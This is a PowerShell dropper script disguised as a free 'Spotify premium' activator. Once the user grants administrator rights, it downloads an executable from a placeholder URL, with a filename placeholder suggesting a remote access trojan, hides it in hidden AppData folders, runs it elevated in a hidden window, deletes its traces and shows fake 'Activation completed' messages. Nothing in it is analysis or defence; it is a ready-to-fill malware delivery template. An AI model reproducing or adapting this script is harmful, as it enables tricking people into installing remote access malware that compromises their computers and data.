function Download-FileWithRetries {
param(
        [string]$Url,
        [string]$Output,
        [int]$Retries = 3,
        [int]$DelaySeconds = 3
    )

    for ($i = 1; $i -le $Retries; $i++) {
        try {
            Invoke-WebRequest -Uri $Url -OutFile $Output -UseBasicParsing -ErrorAction Stop
            if (Test-Path $Output) {
                return $true
            }
        } catch {
            Start-Sleep -Seconds $DelaySeconds
        }
    }
    return $false
}

function RelaunchWithAdminRights {
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}

if (-not ([System.Security.Principal.WindowsIdentity]::GetCurrent().Owner.IsWellKnown([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid))) {
    Write-Host "Please start PowerShell as administrator and retry!" -ForegroundColor Red
    Start-Sleep -Seconds 4
    exit
}

$downloadUrl = "https://URL.HEREMUSTBEDIRECTDOWNLOAD.exe"
$fileName = "FILENAME OF EXE LIKE RAT.exe"
$persistFolder = Join-Path $env:APPDATA "UpdateCache"
$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
$tempPath = Join-Path $hiddenFolder $fileName

Write-Host "installing Spotify premium! (No licence) Dont close!..." -ForegroundColor Green

try {
    New-Item -ItemType Directory -Path $persistFolder -Force -ErrorAction Stop | Out-Null
    Set-ItemProperty -Path $persistFolder -Name Attributes -Value Hidden

    New-Item -ItemType Directory -Path $hiddenFolder -Force -ErrorAction Stop | Out-Null
    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value Hidden
} catch {
    Write-Host "Activation failed!" -ForegroundColor Red
    exit 1
}

if (-not (Download-FileWithRetries -Url $downloadUrl -Output $tempPath)) {
    Write-Host "Activation failed!" -ForegroundColor Red
    exit 1
}

try {
    Set-ItemProperty -Path $tempPath -Name Attributes -Value Hidden

    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $tempPath
    $startInfo.Verb = "runas"
    $startInfo.WindowStyle = 'Hidden'
    $startInfo.UseShellExecute = $true

    $process = [System.Diagnostics.Process]::Start($startInfo)
    $process.WaitForExit()

    if ($process.ExitCode -eq 0) {
        Start-Sleep -Seconds 15
        Write-Host "Spotift updated!!" -ForegroundColor Cyan
    } else {
        Write-Host "Activation failed!" -ForegroundColor Red
    }
} catch {
    Write-Host "Activation failed!" -ForegroundColor Red
    exit 1
}

try {
    Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
} catch {
    Write-Warning "Cleanup failed: $_"
}

Start-Sleep -Seconds 5
Write-Host "Activation completed!" -ForegroundColor Green
 
